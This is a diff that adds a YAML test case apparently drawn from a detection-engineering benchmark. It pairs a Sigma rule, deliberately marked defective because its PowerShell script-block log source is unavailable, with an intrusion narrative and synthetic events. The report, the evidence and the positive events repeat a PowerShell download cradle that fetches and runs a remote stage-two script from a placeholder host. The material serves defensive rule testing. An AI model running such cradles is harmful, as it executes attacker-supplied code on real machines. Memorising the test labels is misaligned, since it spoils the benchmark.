@@ -1,0 +1,108 @@
+id: D5-01
+role: defective
+defect_class: D5
+evasive: false
+why: 'The rule''s only discriminating field is ScriptBlockText on a PowerShell script block log source
+  (event 4104), and the laboratory catalog marks windows_powershell_script_block as available: false,
+  so the rule cannot fire on any telemetry the laboratory collects. Everything else (metadata, tags, evidence-backed
+  values) is valid.'
+expected_gate: G6
+report_text: 'During the intrusion at a regional freight broker, the operator launched PowerShell with
+  an encoded command, so the process command line showed only an opaque Base64 string. The analyst team
+  enabled PowerShell script block logging on the affected servers and recovered the decoded body from
+  event 4104. The decoded script block was a classic download cradle: it built a Net.WebClient object,
+  called DownloadString against a staging server and piped the result straight into Invoke-Expression.
+  The recovered text read: IEX (New-Object Net.WebClient).DownloadString(''http://cdn-assets.glasswharf.example/stage2.ps1'').
+  The staging host cdn-assets.glasswharf.example served only a second-stage loader and was registered
+  two days before the intrusion. We assess the cradle as the first hands-on-keyboard action after initial
+  access, and the only place it is visible in cleartext is the script block log, because the command line
+  itself was encoded.'
+evidence:
+- IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')
+- 'The decoded script block was a classic download cradle: it built a Net.WebClient object, called DownloadString
+  against a staging server and piped the result straight into Invoke-Expression.'
+logsource: windows_powershell_script_block
+techniques:
+- T1059.001
+- T1105
+sigma_yaml: |
+  title: PowerShell Script Block Download Cradle From Staging Host
+  id: 3f6a1c52-8e47-4b0d-9a21-5c7d0e1f4a01
+  status: experimental
+  description: Detects a decoded PowerShell script block that fetches a second stage with Net.WebClient DownloadString from the staging host named in the report.
+  references:
+    - urn:atidep:case
+  author: case-author
+  date: 2026/10/02
+  tags:
+    - attack.execution
+    - attack.t1059.001
+    - attack.command_and_control
+    - attack.t1105
+  logsource:
+    category: ps_script
+    product: windows
+  detection:
+    selection:
+      ScriptBlockText|contains|all:
+        - Net.WebClient
+        - DownloadString
+        - cdn-assets.glasswharf.example
+    condition: selection
+  falsepositives:
+    - Administrator scripts that download modules from the same host during an approved change
+  level: high
+assumptions: []
+events:
+  positive:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "IEX (New-Object Net.WebClient).DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe /c start powershell
+    user: LAB\svc-freight
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -ExecutionPolicy Bypass -Command "$w = New-Object Net.WebClient; IEX $w.DownloadString('http://cdn-assets.glasswharf.example/stage2.ps1')"
+    parent: C:\Windows\System32\wbem\WmiPrvSE.exe
+    parent_cmd: C:\Windows\System32\wbem\WmiPrvSE.exe -secured -Embedding
+    user: LAB\svc-freight
+    dest_ip: null
+    dest_port: null
+    name: null
+  negative:
+  - kind: process_create
+    image: C:\Windows\System32\notepad.exe
+    cmd: notepad.exe C:\Users\alice\notes.txt
+    parent: C:\Windows\explorer.exe
+    parent_cmd: explorer.exe
+    user: LAB\alice
+    dest_ip: null
+    dest_port: null
+    name: null
+  - kind: process_create
+    image: C:\Windows\System32\ipconfig.exe
+    cmd: ipconfig /all
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\bob
+    dest_ip: null
+    dest_port: null
+    name: null
+  lookalike:
+  - kind: process_create
+    image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+    cmd: powershell.exe -NoProfile -Command "(New-Object Net.WebClient).DownloadString('https://repo.corp.example/modules/index.txt')"
+    parent: C:\Windows\System32\cmd.exe
+    parent_cmd: cmd.exe
+    user: LAB\admin-carol
+    dest_ip: null
+    dest_port: null
+    name: null
+tamper_sigma_yaml: ''
+review: {}
+excluded: false
+exclusion_reason: ''
